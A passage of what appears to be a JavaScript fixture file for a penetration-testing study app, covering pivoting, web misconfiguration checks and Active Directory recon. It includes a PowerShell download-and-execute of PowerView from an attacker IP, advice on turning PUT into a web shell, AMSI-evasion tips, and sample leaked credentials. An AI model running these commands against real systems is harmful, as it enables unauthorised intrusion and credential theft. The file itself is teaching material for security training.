    "pivot-sshuttle": {situation:"The pivot host is Linux, you hold bob's SSH password, and it routes to 172.16.5.0/24. You want the least-friction tunnel with nothing uploaded. Which pivot?", choices:["pivot-sshuttle","pivot-chisel-socks","pivot-ligolo","pivot-ssh-dynamic"], coach:{"pivot-chisel-socks":"That uploads an agent and gives a SOCKS proxy you must wrap; with SSH creds sshuttle is lower-friction and transparent.","pivot-ligolo":"Also uploads an agent; sshuttle needs nothing on the target when you already have SSH.","pivot-ssh-dynamic":"Close, and also SSH-only, but it gives a SOCKS proxy you wrap in proxychains; sshuttle is transparent, no wrapper."}},
    "pivot-ssh-dynamic": {situation:"You hold SSH creds on the foothold and want a SOCKS proxy for proxychains and your browser, without uploading anything. Which pivot?", choices:["pivot-ssh-dynamic","pivot-sshuttle","pivot-chisel-socks","pivot-ligolo"], coach:{"pivot-sshuttle":"That is transparent with no SOCKS endpoint; if you specifically want a SOCKS proxy for proxychains or a browser, ssh -D is the direct fit.","pivot-chisel-socks":"That uploads an agent; with SSH creds you get a SOCKS proxy from one ssh flag, nothing to drop.","pivot-ligolo":"Also an uploaded agent and a tun interface, overkill when one SSH flag gives the SOCKS proxy you want."}},
    "pivot-scan-through": {situation:"A SOCKS tunnel to 172.16.5.0/24 is up, but a normal nmap 172.16.5.20 just hangs. What is wrong?", choices:["pivot-scan-through","pivot-chisel-socks","local-linux-routes","pivot-ligolo"], coach:{"pivot-chisel-socks":"The tunnel is already built; the hang is a scan-flags problem, not a tunnel problem.","local-linux-routes":"Routes are how you found the subnet; the hang is nmap defaulting to a SYN scan and a ping that a SOCKS proxy drops.","pivot-ligolo":"Switching tunnels would not help; with a SOCKS proxy you must use -sT -Pn, which is the actual fix."}}
  };
  Object.keys(PIVOT_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = PIVOT_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === CHECKS LANE ================================================================================
  var CHECKS_LEADUPS = {
    "check-tls-config": [
      { key: "https", label: "A TLS service is open", steps: [
        { title: "nmap found 443", tool: "nmap", where: "local", cmd: "nmap -p 443 10.10.10.10", out: "443/tcp open  https", sig: "443/tcp open  https", teach: "Any TLS service is worth a quick cert and cipher read; it is a free finding and often leaks internal names." } ] },
    ],
    "check-http-methods": [
      { key: "web", label: "A web server is open", steps: [
        { title: "nmap found 80", tool: "nmap", where: "local", cmd: "nmap -p 80 10.10.10.10", out: "80/tcp open  http", sig: "80/tcp open  http", teach: "An OPTIONS request against any web server lists the verbs it allows, a one-request finding." } ] },
    ],
    "check-cors": [
      { key: "api", label: "The app has an authenticated API", steps: [
        { title: "You found an API endpoint", tool: "curl", where: "local", cmd: "curl -sSIk http://10.10.10.10/api/me", out: "HTTP/1.1 200 OK\nContent-Type: application/json", sig: "application/json", teach: "An endpoint that returns authenticated data is where a permissive CORS policy turns dangerous." } ] },
    ],
    "check-http-redirect": [
      { key: "web", label: "Both 80 and 443 answer", steps: [
        { title: "A web server answers on 80", tool: "nmap", where: "local", cmd: "nmap -p 80,443 10.10.10.10", out: "80/tcp  open  http\n443/tcp open  https", sig: "80/tcp  open  http", teach: "With both 80 and 443 open, check whether 80 forces you onto 443 or serves content in the clear." } ] },
    ],
    "check-subdomain-takeover": [
      { key: "subs", label: "You enumerated subdomains", steps: [
        { title: "A subdomain list is in hand", tool: "subfinder", where: "local", cmd: "subfinder -d acme.internal -silent", out: "shop.acme.internal\nblog.acme.internal", sig: "shop.acme.internal", teach: "Each subdomain's CNAME is worth a glance; a dangling one pointing off-site is a takeover." } ] },
    ],
    "check-dns-email": [
      { key: "domain", label: "A domain is in scope", steps: [
        { title: "The engagement includes a domain", tool: "dig", where: "local", cmd: "dig +short NS acme.internal", out: "ns1.acme.internal.", sig: "ns1.acme.internal", teach: "With a domain in scope, two TXT lookups tell you whether it can be spoofed in phishing." } ] },
    ],
    "check-web-headers": [
      { key: "web", label: "A web app is up", steps: [
        { title: "The first HEAD already leaks", tool: "curl", where: "local", cmd: "curl -sSIk http://10.10.10.10/", out: "HTTP/1.1 200 OK\nServer: Apache/2.4.29 (Ubuntu)", sig: "Server: Apache/2.4.29", teach: "The very first HEAD leaks the server version; read the whole header block for findings and leads." } ] },
    ],
    "check-web-components": [
      { key: "web", label: "The app is up and triaged", steps: [
        { title: "A framework cookie hints at the stack", tool: "curl", where: "local", cmd: "curl -sSIk http://10.10.10.10/", out: "HTTP/1.1 200 OK\nSet-Cookie: joomla_session=8a1f...; path=/", sig: "joomla_session", teach: "A framework cookie already hints at the stack; fingerprint it precisely before matching CVEs." } ] },
    ],
    "check-cms-version": [
      { key: "cms", label: "You fingerprinted the CMS", steps: [
        { title: "whatweb named the CMS", tool: "whatweb", where: "local", cmd: "whatweb http://10.10.10.10/ | grep -oE 'Drupal'", out: "Drupal", sig: "Drupal", teach: "Knowing it is Drupal is not enough; the exact version decides which CVEs apply." } ] },
    ],
    "check-web-body": [
      { key: "web", label: "A web app is up", steps: [
        { title: "Headers read, body next", tool: "curl", where: "local", cmd: "curl -sSIk http://10.10.10.10/", out: "HTTP/1.1 200 OK\nContent-Type: text/html", sig: "HTTP/1.1 200 OK", teach: "After the headers, read the body humans never read; findings and secrets hide in the markup." } ] },
    ],
    "check-exposed-files": [
      { key: "web", label: "A web app is up", steps: [
        { title: "A web app is up", tool: "curl", where: "local", cmd: "curl -sSIk http://10.10.10.10/", out: "HTTP/1.1 200 OK\nServer: nginx/1.18.0", sig: "Server: nginx", teach: "Before anything clever, probe the well-known leak paths; a readable .env can end the engagement early." } ] },
    ]
  };
  Object.keys(CHECKS_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = CHECKS_LEADUPS[k]; });

  var CHECKS_HOW = {
    "check-tls-config": {"lead":"nmap's ssl scripts read the cert and ciphers without touching the app; mine the cert for names and the ciphers for weak protocols.","items":[
      {"t":"Read cert and ciphers","d":"ssl-cert dumps the subject/SAN and validity; ssl-enum-ciphers grades each protocol.","demo":[{"run":"nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.10","out":"| ssl-cert: Subject: commonName=vault.acme.internal\n| Not valid after:  2021-03-14T00:00:00\n| ssl-enum-ciphers:\n|   TLSv1.0: (weak)","sig":"vault.acme.internal"}],"note":"An expired cert and TLS 1.0 are report findings; vault.acme.internal is a new host to add."},
      {"t":"Mine the SAN for hostnames","d":"The SAN list often names several internal vhosts behind one IP.","demo":[{"run":"echo | openssl s_client -connect 10.10.10.10:443 2>/dev/null | openssl x509 -noout -text | grep DNS","out":"DNS:vault.acme.internal, DNS:mail.acme.internal","sig":"mail.acme.internal"}],"note":"Each SAN name is a vhost to try; add them to /etc/hosts."},
      {"t":"Grade the protocols fast","d":"testssl.sh gives a one-shot grade of every protocol and cipher.","demo":[{"run":"testssl.sh --quiet 10.10.10.10:443","out":"SSLv3     offered (NOT ok)\nTLS 1.0   offered (deprecated)","sig":"SSLv3     offered (NOT ok)"}],"note":"SSLv3 offered is a clear, defensible finding on its own."}]},
    "check-http-methods": {"lead":"OPTIONS lists the allowed verbs; PUT and DELETE are reportable and sometimes exploitable.","items":[
      {"t":"Ask with OPTIONS","d":"curl -X OPTIONS and read the Allow header.","demo":[{"run":"curl -sSIkLX OPTIONS http://10.10.10.10/","out":"HTTP/1.1 200 OK\nAllow: GET, HEAD, POST, OPTIONS, PUT, DELETE","sig":"PUT, DELETE"}],"note":"PUT and DELETE in the Allow header are a red flag; PUT may let you upload a shell."},
      {"t":"Test whether PUT actually works","d":"Allowed in OPTIONS does not always mean enabled; try writing a harmless file.","demo":[{"run":"curl -skX PUT http://10.10.10.10/test.txt -d 'hello' && curl -sk http://10.10.10.10/test.txt","out":"hello","sig":"hello"}],"note":"If your PUT content comes back, you have arbitrary file write, escalate to a web shell via verb-tampering."},
      {"t":"Check TRACE for XST","d":"TRACE enabled can reflect headers (Cross-Site Tracing); minor but reportable.","demo":[{"run":"curl -sSIkLX TRACE http://10.10.10.10/","out":"HTTP/1.1 200 OK\nContent-Type: message/http","sig":"message/http"}],"note":"A 200 with message/http means TRACE is on, a low-severity finding."}]},
    "check-cors": {"lead":"Send a spoofed Origin and watch whether the server reflects it and allows credentials, the dangerous pair.","items":[
      {"t":"Reflect an arbitrary Origin","d":"Send Origin: https://evil.example and read Access-Control-Allow-Origin in the response.","demo":[{"run":"curl -sSIkL -H \"Origin: https://evil.example\" http://10.10.10.10/api/me","out":"HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true","sig":"Access-Control-Allow-Origin: https://evil.example"}],"note":"The server echoed your Origin and allows credentials, a malicious page could read a victim's responses."},
      {"t":"Test the null origin","d":"Some servers trust Origin: null, reachable from a sandboxed iframe.","demo":[{"run":"curl -sSIkL -H \"Origin: null\" http://10.10.10.10/api/me","out":"Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true","sig":"Access-Control-Allow-Origin: null"}],"note":"null plus credentials is exploitable from a sandboxed iframe; still a finding."},
      {"t":"Confirm the dangerous pair","d":"A reflected Origin alone is low impact; with Allow-Credentials true it leaks authenticated data.","demo":[{"run":"curl -sSIkL -H \"Origin: https://evil.example\" http://10.10.10.10/api/me | grep -i access-control","out":"Access-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true","sig":"Access-Control-Allow-Credentials: true"}],"note":"Both lines together is the high-value finding; one without the other is weak."}]},
    "check-http-redirect": {"lead":"HEAD plain http:// without following redirects; a 200 means cleartext, a 301 to https is the fix, and the Location may leak a name.","items":[
      {"t":"HEAD without following","d":"curl -I and do NOT pass -L; read the status line and any Location.","demo":[{"run":"curl -sSIk http://10.10.10.10/","out":"HTTP/1.1 200 OK\nContent-Type: text/html","sig":"HTTP/1.1 200 OK"}],"note":"A 200 on plain http means the site serves content unencrypted, a report finding."},
      {"t":"Compare with a redirecting site","d":"A well-configured site answers 301 to the https URL.","demo":[{"run":"curl -sSIk http://secure.acme.internal/","out":"HTTP/1.1 301 Moved Permanently\nLocation: https://dev-internal.acme.internal/","sig":"dev-internal.acme.internal"}],"note":"The 301 is correct, but its Location leaked dev-internal.acme.internal, a new host to target."},
      {"t":"Add any leaked name","d":"Put leaked hostnames in /etc/hosts so vhost-routed content resolves.","demo":[{"run":"echo '10.10.10.10 dev-internal.acme.internal' | sudo tee -a /etc/hosts","out":"10.10.10.10 dev-internal.acme.internal","sig":"dev-internal.acme.internal"}],"note":"Now requests to that name reach the right vhost; the redirect widened your surface."}]},
    "check-subdomain-takeover": {"lead":"Resolve each CNAME; a target pointing at an unclaimed third-party service is the finding.","items":[
      {"t":"Resolve the CNAME","d":"dig CNAME reveals where the name actually points.","demo":[{"run":"dig +noall +answer CNAME shop.acme.internal","out":"shop.acme.internal. 300 IN CNAME shop-acme.s3.amazonaws.com.","sig":"s3.amazonaws.com"}],"note":"The name points at an S3 bucket; if that bucket is unclaimed, you can take it."},
      {"t":"Confirm the target is unclaimed","d":"Fetch it; a service-specific 'no such bucket/app' page means it is free to register.","demo":[{"run":"curl -sk http://shop.acme.internal/","out":"<Error><Code>NoSuchBucket</Code><BucketName>shop-acme</BucketName></Error>","sig":"NoSuchBucket"}],"note":"NoSuchBucket confirms the dangling target; register shop-acme and you own the subdomain's content."},
      {"t":"Match the provider fingerprint","d":"Each provider has a known takeover fingerprint; subjack automates matching.","demo":[{"run":"subjack -d shop.acme.internal -ssl","out":"[Vulnerable] shop.acme.internal -> shop-acme.s3.amazonaws.com (S3 Bucket)","sig":"[Vulnerable]"}],"note":"A Vulnerable verdict means the provider fingerprint matched an unclaimed target."}]},
    "check-dns-email": {"lead":"Read the SPF (TXT at the apex) and DMARC (TXT at _dmarc); missing or p=none is the finding.","items":[
      {"t":"Read the SPF record","d":"A TXT at the domain apex starting v=spf1; no record, or +all, is permissive.","demo":[{"run":"dig +short TXT acme.internal","out":"\"v=spf1 include:_spf.google.com ~all\"","sig":"v=spf1"}],"note":"~all is softfail (weak); -all is strict. A missing SPF is worse and reportable."},
      {"t":"Read the DMARC policy","d":"A TXT at _dmarc with p= set to none, quarantine, or reject.","demo":[{"run":"dig +short TXT _dmarc.acme.internal","out":"\"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal\"","sig":"p=none"}],"note":"p=none means forged mail is unlikely to be rejected, a spoofing finding."},
      {"t":"Note what is missing","d":"No DMARC TXT at all is the strongest finding; the domain is trivially spoofable.","demo":[{"run":"dig +short TXT _dmarc.legacy.acme.internal","out":"(no records returned)","sig":"(no records returned)"}],"note":"No DMARC published means the domain can be spoofed outright."}]},
    "check-web-headers": {"lead":"One HEAD surfaces missing security headers and a leaked version; the absences are findings, the version is a lead.","items":[
      {"t":"Read the response headers","d":"curl -I lists every header; note what is present and, more importantly, what is missing.","demo":[{"run":"curl -sSIkL http://10.10.10.10/","out":"HTTP/1.1 200 OK\nServer: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.24","sig":"X-Powered-By: PHP/7.2.24"}],"note":"No HSTS, no CSP, no X-Frame-Options here; X-Powered-By leaks PHP 7.2.24 for your CVE search."},
      {"t":"Spot the missing protections","d":"Grep for the headers that should be present; their absence is the finding.","demo":[{"run":"curl -sSIkL http://10.10.10.10/ | grep -iE 'strict-transport|content-security|x-frame' || echo 'none present'","out":"none present","sig":"none present"}],"note":"None present means HSTS, CSP, and X-Frame-Options are all missing, three report bullets."},
      {"t":"Turn the version into a lead","d":"The leaked server/tech version maps to CVEs; search it.","demo":[{"run":"searchsploit apache 2.4.29","out":"Apache 2.4.x mod_ssl - ... | multiple/remote/...","sig":"Apache 2.4"}],"note":"Read headers for leads, not just findings; the version header starts your exploit hunt."}]},
    "check-web-components": {"lead":"Read script sources, generator meta, Server header, and cookies together; they name the components and versions.","items":[
      {"t":"Read the page for tells","d":"A GET exposes generator meta tags and script paths that name the framework.","demo":[{"run":"curl -sSikL http://10.10.10.10/ | grep -iE 'generator|/templates/|joomla'","out":"<meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" />","sig":"Joomla"}],"note":"The generator meta names Joomla; now pin the exact version."},
      {"t":"Confirm with whatweb","d":"whatweb fingerprints many components at once from one request.","demo":[{"run":"whatweb http://10.10.10.10/","out":"http://10.10.10.10 [200 OK] Joomla[3.9], PHP[7.2.24], Apache[2.4.29]","sig":"Joomla[3.9]"}],"note":"whatweb agrees: Joomla 3.9 on PHP 7.2.24, a precise stack to match CVEs against."},
      {"t":"List client-side libraries","d":"Old jQuery or bootstrap in the script tags can carry their own CVEs.","demo":[{"run":"curl -sk http://10.10.10.10/ | grep -oE 'jquery[.-][0-9.]+' | head -1","out":"jquery-1.12.4","sig":"jquery-1.12.4"}],"note":"jQuery 1.12.4 is old; note every versioned library, not just the CMS."}]},
    "check-cms-version": {"lead":"Pin the version from the files that publish it (CHANGELOG, readme, manifest, composer.lock); the exact build decides the CVE.","items":[
      {"t":"Read the CHANGELOG","d":"Many CMSes ship a web-readable CHANGELOG whose first entry is the version.","demo":[{"run":"curl -sSkL http://10.10.10.10/CHANGELOG.txt | head -1","out":"Drupal 7.57, 2018-02-21","sig":"Drupal 7.57"}],"note":"Drupal 7.57 maps straight to Drupalgeddon2 (CVE-2018-7600)."},
      {"t":"Try the version files per CMS","d":"WordPress has readme.html, Joomla a manifest, Composer apps a composer.lock.","demo":[{"run":"curl -sSkL http://10.10.10.10/administrator/manifests/files/joomla.xml | grep -oE '<version>[0-9.]+'","out":"<version>3.9.4","sig":"3.9.4"}],"note":"The Joomla manifest pins 3.9.4; match it against Joomla CVEs."},
      {"t":"Map the version to an exploit","d":"searchsploit the CMS and version to list named exploits.","demo":[{"run":"searchsploit drupal 7.57","out":"Drupal < 7.58 - 'Drupalgeddon2' RCE | php/webapps/44448.rb","sig":"Drupalgeddon2"}],"note":"The exact version turns into a specific, named exploit to run."}]},
    "check-web-body": {"lead":"Read the source for mixed content, weak forms, and the comments and JS that leak secrets.","items":[
      {"t":"Grep the body for leaks","d":"View source for HTML comments and inline JS; developers leave creds and TODOs there.","demo":[{"run":"curl -sSkL http://10.10.10.10/ | grep -iE '<!--|password|todo|test'","out":"<!-- test / test works for the staging login -->","sig":"test / test"}],"note":"A test/test credential in a comment is a free working login, the page humans never read pays off."},
      {"t":"Flag insecure resource refs","d":"http:// scripts or images on an HTTPS page are mixed content, a reportable finding.","demo":[{"run":"curl -sSkL https://10.10.10.10/ | grep -oE 'src=\"http://[^\"]+' | head -1","out":"src=\"http://cdn.acme.internal/app.js","sig":"src=\"http://"}],"note":"An http:// script on an HTTPS page is mixed content; note it in the report."},
      {"t":"Check forms for weak settings","d":"A login form allowing autocomplete, or a POST form with no CSRF token, are body-level findings.","demo":[{"run":"curl -sSkL http://10.10.10.10/login | grep -iE 'autocomplete|csrf|<form'","out":"<form method=\"POST\" action=\"/login\" autocomplete=\"on\">","sig":"autocomplete=\"on\""}],"note":"autocomplete on a login and no csrf token are two small, defensible findings."}]},
    "check-exposed-files": {"lead":"GET the usual leaked paths; a .env, a .git tree, server-status, or an editor .bak can hand you secrets or source.","items":[
      {"t":"Probe for a .env","d":"Framework apps keep DB and API creds in .env, which should never be web-served.","demo":[{"run":"curl -sSkL http://10.10.10.10/.env","out":"DB_PASSWORD=S3cr3tDB\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG","sig":"DB_PASSWORD=S3cr3tDB"}],"note":"A readable .env hands you database and cloud credentials outright."},
      {"t":"Check for an exposed .git","d":"A web-served .git tree can be dumped back into full source with git-dumper.","demo":[{"run":"curl -sSk http://10.10.10.10/.git/HEAD","out":"ref: refs/heads/master","sig":"ref: refs/heads/master"}],"note":"A valid .git/HEAD means the repo is dumpable; git-dumper reconstructs the source."},
      {"t":"Look for status and backups","d":"server-status leaks live requests; editor .bak or ~ files leak source.","demo":[{"run":"curl -sSk http://10.10.10.10/server-status","out":"Apache Server Status for 10.10.10.10\nGET /admin/config.php HTTP/1.1","sig":"Apache Server Status"}],"note":"server-status exposes live URLs, including admin paths worth visiting."}]}
  };
  Object.keys(CHECKS_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = CHECKS_HOW[k]; });

  var CHECKS_PRACTICE = {
    "check-tls-config": {situation:"You want a free, no-risk report finding and possibly some internal hostnames from an HTTPS service. What do you run?", choices:["check-tls-config","check-web-headers","check-http-methods","check-cors"], coach:{"check-web-headers":"That reads HTTP response headers, not the certificate; the cert is where expiry, weak ciphers, and SAN hostnames live.","check-http-methods":"That lists allowed verbs, a different finding; the TLS cert and cipher read is what you want here.","check-cors":"That tests cross-origin policy on the app; the certificate review is the transport-layer check you are after."}},
    "check-http-methods": {situation:"You want to know in one request whether a web server allows dangerous HTTP verbs like PUT. What do you run?", choices:["check-http-methods","check-web-headers","check-cors","check-exposed-files"], coach:{"check-web-headers":"That reads security headers, not the allowed verb set; OPTIONS is what lists PUT and DELETE.","check-cors":"That tests cross-origin reflection, a different misconfiguration from allowed verbs.","check-exposed-files":"That probes for leaked files; the verb list comes from an OPTIONS request."}},
    "check-cors": {situation:"An app serves authenticated JSON. You want to know if another site could read a logged-in victim's responses. What do you test?", choices:["check-cors","check-http-methods","check-web-headers","check-web-body"], coach:{"check-http-methods":"That lists allowed verbs; cross-origin read risk comes from the CORS response headers.","check-web-headers":"General header hygiene overlaps, but the specific test is a spoofed Origin against the authenticated endpoint.","check-web-body":"That reads markup; CORS lives in the response headers to a cross-origin request."}},
    "check-http-redirect": {situation:"Both 80 and 443 are open. You want to know if the site exposes traffic in the clear and whether its redirect leaks anything. What do you run?", choices:["check-http-redirect","check-tls-config","check-web-headers","check-cors"], coach:{"check-tls-config":"That reviews the certificate on 443; the cleartext question is answered by a HEAD of plain http:// that you do not follow.","check-web-headers":"Header hygiene is related, but the specific test is whether http:// redirects or serves content.","check-cors":"A different issue entirely; this is about transport encryption, not cross-origin policy."}},
    "check-subdomain-takeover": {situation:"You have a list of subdomains and want to find one you could take over. What do you check on each?", choices:["check-subdomain-takeover","check-dns-email","check-tls-config","check-web-components"], coach:{"check-dns-email":"That reviews SPF/DMARC for spoofing, a different DNS finding; takeover is about dangling CNAMEs.","check-tls-config":"That reads certificates; takeover is a DNS CNAME-and-provider question.","check-web-components":"That fingerprints the app stack; here you resolve each CNAME and test if its target is unclaimed."}},
    "check-dns-email": {situation:"A domain is in scope and you want a defensible report finding about mail spoofing. What two records do you read?", choices:["check-dns-email","check-subdomain-takeover","check-tls-config","check-web-headers"], coach:{"check-subdomain-takeover":"That hunts dangling CNAMEs; spoofing risk comes from the SPF and DMARC TXT records.","check-tls-config":"That reviews the web certificate, unrelated to email authentication records.","check-web-headers":"HTTP headers are a web finding; mail spoofing is judged from SPF and DMARC DNS records."}},
    "check-web-headers": {situation:"You just loaded a web app and want the fastest batch of report findings plus a version lead for CVEs. What do you run first?", choices:["check-web-headers","check-web-body","check-cms-version","check-http-methods"], coach:{"check-web-body":"That reads the page source, a good follow-up; the header block is the faster first pass for missing protections and the version.","check-cms-version":"That pins a CMS build; the generic security-header read comes first and often reveals the stack already.","check-http-methods":"That lists allowed verbs, a narrower check; start with the header review for the easy wins."}},
    "check-web-components": {situation:"You want to turn 'it is some CMS' into a named stack and version you can match CVEs against. What do you run right after triage?", choices:["check-web-components","check-cms-version","check-web-headers","check-exposed-files"], coach:{"check-cms-version":"That is the very next step, pinning the exact build; first you fingerprint which CMS it is from the page tells.","check-web-headers":"Headers help and overlap, but component fingerprinting reads the body tells and cookies too, not just headers.","check-exposed-files":"That hunts leaked files; identifying the component stack comes from the page's own fingerprint."}},
    "check-cms-version": {situation:"whatweb says the app is Drupal but not which version. You need to know whether Drupalgeddon2 applies. What do you read?", choices:["check-cms-version","check-web-components","check-exposed-files","check-web-body"], coach:{"check-web-components":"That already told you it is Drupal; now you pin the exact build from its version files.","check-exposed-files":"That hunts secrets like .env; the CMS version lives in CHANGELOG, readme, and manifest files.","check-web-body":"Body review catches comments and forms; the precise version comes from the CMS's own version files."}},
    "check-web-body": {situation:"The header checks are done. You suspect the HTML itself hides findings or even credentials. What do you read?", choices:["check-web-body","check-web-headers","check-exposed-files","check-cms-version"], coach:{"check-web-headers":"Already done, that read the headers; the body review catches what the headers miss, comments, forms, mixed content.","check-exposed-files":"That probes separate well-known paths; this is about reading the page's own source.","check-cms-version":"That pins a build from version files; body review is about comments, forms, and inline secrets."}},
    "check-exposed-files": {situation:"Before anything clever on a new web app, you want the highest-payoff quick wins: leaked source or secrets. What do you probe?", choices:["check-exposed-files","check-web-body","check-web-components","check-http-methods"], coach:{"check-web-body":"That reads the main page source; this probes separate well-known paths like .env and .git not linked from the page.","check-web-components":"That fingerprints the stack; exposed-file probing is the quick-win hunt for leaked secrets and source.","check-http-methods":"That lists verbs; the quick secret wins come from GETting .env, .git, and server-status."}}
  };
  Object.keys(CHECKS_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = CHECKS_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === AD LANE : batch 1 (Recon & Enumeration) ===================================================
  var AD1_LEADUPS = {
    "ad-dc-identify": [
      { key: "scan", label: "A scan shows the AD fingerprint", steps: [
        { title: "88, 389, 445 together", tool: "nmap", where: "local", cmd: "nmap -p 88,389,445,636,3268 10.10.10.10", out: "88/tcp   open  kerberos-sec\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n3268/tcp open  globalcatLDAP", sig: "88/tcp   open  kerberos-sec", teach: "Kerberos on 88 plus LDAP and SMB is the DC fingerprint; now name the domain and the DC." } ] },
    ],
    "ad-anon-ldap-enum": [
      { key: "dc", label: "You identified the DC", steps: [
        { title: "The DC and domain are known", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10", out: "SMB  10.10.10.10  445  DC01  (domain:acme.internal) (signing:True)", sig: "domain:acme.internal", teach: "With the domain named, try an anonymous LDAP bind before you spend effort hunting a credential." } ] },
    ],
    "ad-user-enum": [
      { key: "nobind", label: "The anonymous bind was closed", steps: [
        { title: "Anonymous LDAP gave nothing", tool: "nxc", where: "local", cmd: "nxc ldap 10.10.10.10 -u '' -p '' --users", out: "LDAP  10.10.10.10  389  DC01  [-] Anonymous bind not allowed", sig: "Anonymous bind not allowed", teach: "With the bind closed, build the user list from Kerberos instead, still no credentials needed." } ] },
    ],
    "bloodhound-collect": [
      { key: "cred", label: "You hold a domain credential", steps: [
        { title: "A credential works", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!", sig: "acme.internal\\jbloggs", teach: "With any domain credential, collect the graph and let it find the escalation path for you." } ] },
    ],
    "ad-path-manual": [
      { key: "cred", label: "You have a credential, a collector is risky", steps: [
        { title: "A credential works but SharpHound is risky", tool: "nxc", where: "local", cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "LDAP  10.10.10.10  389  DC01  [+] acme.internal\\jbloggs:Autumn2026!", sig: "acme.internal\\jbloggs", teach: "When you cannot or will not run a collector, query the same facts directly and keep moving." } ] },
    ],
    "nxc-arsenal": [
      { key: "cred", label: "You hold a domain credential", steps: [
        { title: "A credential works", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!", sig: "acme.internal\\jbloggs", teach: "One credential plus nxc covers most of a domain assessment under a single syntax." } ] },
    ],
    "powerview-enum": [
      { key: "foothold", label: "You have a Windows foothold", steps: [
        { title: "You are on a domain-joined box", tool: "evil-winrm", where: "host", cmd: "whoami", out: "acme\\jbloggs", sig: "acme\\jbloggs", teach: "On a domain-joined Windows box, PowerView gives inside-the-domain recon with no upload beyond the script." } ] },
    ],
    "ad-legacy-enum": [
      { key: "locked", label: "Uploads and PowerView are blocked", steps: [
        { title: "A locked-down Windows foothold", tool: "cmd", where: "host", cmd: "whoami", out: "acme\\jbloggs", sig: "acme\\jbloggs", teach: "When AMSI eats PowerView and you cannot upload, built-in tools still answer the first-pass questions." } ] },
    ],
    "ad-psdotnet-enum": [
      { key: "amsi", label: "AMSI blocked PowerView", steps: [
        { title: "PowerView is signatured", tool: "powershell", where: "host", cmd: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1')", out: "This script contains malicious content and has been blocked by your antivirus software.", sig: "blocked by your antivirus", teach: "When AMSI blocks PowerView, bare .NET classes do the same recon with nothing to signature." } ] },
    ],
    "trust-enum": [
      { key: "foothold", label: "You own one domain", steps: [
        { title: "You have a foothold in one domain", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs", sig: "acme.internal\\jbloggs", teach: "Before declaring victory, check whether this domain trusts, or is trusted by, a richer one." } ] },
    ]
  };
  Object.keys(AD1_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = AD1_LEADUPS[k]; });

  var AD1_HOW = {
    "ad-dc-identify": {"lead":"An unauthenticated SMB or LDAP query names the domain and the DC, the two facts every later AD command needs.","items":[
      {"t":"Name the domain over SMB","d":"nxc smb with no creds prints the hostname, domain, and OS from the SMB banner.","demo":[{"run":"nxc smb 10.10.10.10","out":"SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 (name:DC01) (domain:acme.internal) (signing:True)","sig":"domain:acme.internal"}],"note":"DC01 is the DC, acme.internal is the domain; feed both to every later tool."},
      {"t":"Confirm over LDAP","d":"An anonymous LDAP query returns the naming context, which is the base DN in DN form.","demo":[{"run":"nxc ldap 10.10.10.10 -u '' -p ''","out":"LDAP  10.10.10.10  389  DC01  [+] (defaultNamingContext: DC=acme,DC=internal)","sig":"DC=acme,DC=internal"}],"note":"DC=acme,DC=internal is the base DN for ldapsearch and bloodyAD."},
      {"t":"Get the FQDN exactly right","d":"Kerberos is name-picky, so resolve the DC's full name and host it before any -k attack.","demo":[{"run":"nxc smb 10.10.10.10 --generate-hosts-file hosts && cat hosts","out":"10.10.10.10 dc01.acme.internal acme.internal dc01","sig":"dc01.acme.internal"}],"note":"Add this to /etc/hosts; a wrong FQDN is behind half the impacket failures."}]},
    "ad-anon-ldap-enum": {"lead":"An allowed anonymous bind spills the directory; pull users, then scrape description fields for stashed passwords.","items":[
      {"t":"List users anonymously","d":"nxc ldap -u '' -p '' --users dumps the user list when the bind is open.","demo":[{"run":"nxc ldap 10.10.10.10 -u '' -p '' --users","out":"LDAP  10.10.10.10  389  DC01  [+] Enumerated 24 users\nLDAP  10.10.10.10  389  DC01  jbloggs\nLDAP  10.10.10.10  389  DC01  svc_backup\nLDAP  10.10.10.10  389  DC01  asrep_svc","sig":"Enumerated 24 users"}],"note":"Save these to users.txt; they feed roasting and spraying."},
      {"t":"Scrape description fields","d":"Admins stash passwords in the description attribute, so pull it for every user.","demo":[{"run":"nxc ldap 10.10.10.10 -u '' -p '' --query \"(objectclass=user)\" \"sAMAccountName description\"","out":"sAMAccountName: svc_sql\ndescription: SQL service acct, pw Summer2026! rotate quarterly","sig":"pw Summer2026!"}],"note":"A password in a description is a free credential; try it everywhere."},
